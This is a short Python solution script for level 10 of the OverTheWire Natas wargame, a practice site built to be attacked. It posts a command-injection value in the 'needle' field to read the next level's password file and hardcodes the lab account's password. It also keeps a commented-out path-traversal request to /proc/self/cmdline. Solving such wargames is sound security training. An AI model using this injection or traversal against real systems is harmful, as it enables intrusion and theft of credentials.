#!/usr/bin/env python

import requests
import re

username = 'natas10'
password = 'D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE'

url = 'http://%s.natas.labs.overthewire.org/' % username

#PHP command injection
#because of passthru("grep -i $key dictionary.txt") we can load content from other files
#we can also use other bash sintaxes
#for natas10 we can still use the same method just because the "." character
#was not incuded in the "illegal characters" list as you can see in the source :)

session = requests.session()

response = session.post(url,data = {"needle": ". /etc/natas_webpass/natas11 #", "submit": "submit"}, auth = (username, password))
#response = session.get(url + "index.php?page=../../../../proc/self/cmdline", auth = (username, password)) #see how program is run
content = response.text

print(content)
#print(re.findall('<!--The password for natas3 is (.*) -->', content))